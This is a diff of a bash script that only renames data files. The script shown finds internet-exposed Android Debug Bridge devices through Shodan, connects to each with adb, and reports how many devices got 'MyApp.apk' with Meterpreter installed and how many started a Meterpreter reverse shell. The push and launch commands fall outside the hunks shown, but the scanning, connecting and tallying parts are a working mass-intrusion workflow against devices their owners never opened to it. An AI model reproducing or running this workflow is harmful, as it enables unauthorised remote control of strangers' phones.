@@ -10,22 +10,22 @@ echo "_________________________________________________________________________"
 }
 
 banner 
-IPLIST="data/addresses.txt"
-IPLIST2="data/addresses2.txt"
+IPLIST="data/addresses"
+IPLIST2="data/addresses2"
 #Deletes all present configs 
 
 adb kill-server
 adb start-server
 
-rm data/data.txt & rm data/addresses.txt
+rm data/data & rm data/addresses
 
 sleep 2
 
 #Uses shodan api to search for 'Android Debug Bridge Port:5555' and do some grep voodoo to get IP Lists (only 2 needed)
 
-shodan search Android Debug Bridge > data/data.txt 
+shodan search Android Debug Bridge > data/data
 
-cat data/data.txt | egrep -o '([0-9]{1,3}\.){3}[0-9]{1,3}' > data/addresses.txt
+cat data/data | egrep -o '([0-9]{1,3}\.){3}[0-9]{1,3}' > data/addresses
 
 sleep 1
 
@@ -40,8 +40,8 @@ timeout 3 adb connect $ip
 done
 
 #Populate 
-adb devices -l > data/devices.txt
-cat data/devices.txt | egrep -o '([0-9]{1,3}\.){3}[0-9]{1,3}' > data/addresses2.txt
+adb devices -l > data/devices
+cat data/devices | egrep -o '([0-9]{1,3}\.){3}[0-9]{1,3}' > data/addresses2
 
 
 
@@ -110,16 +110,15 @@ done
 
 banner
 echo "Successfully connected devices:"
-grep -o 'connected' data/logs/results.txt| wc -l
+grep -o 'connected' data/logs/results| wc -l
 echo "Successfully closed debug bridges:"
-grep -o 'restarting in USB mode' data/logs/results.txt| wc -l
+grep -o 'restarting in USB mode' data/logs/results| wc -l
 echo "Successfully uninstalled instances of com.ufo.miner:"
-grep -o 'Success' data/logs/results.txt| wc -l
+grep -o 'Success' data/logs/results| wc -l
 echo "Devices with Meterpreter installed on them:"
-grep -o 'MyApp.apk: 1 file pushed.' data/logs/results.txt| wc -l
+grep -o 'MyApp.apk: 1 file pushed.' data/logs/results| wc -l
 echo "Devices that successfully ran Meterpreter reverse shell:"
-grep -o 'Starting:' data/logs/results.txt| wc -l
-
+grep -o 'Starting:' data/logs/results| wc -l
 
 
 
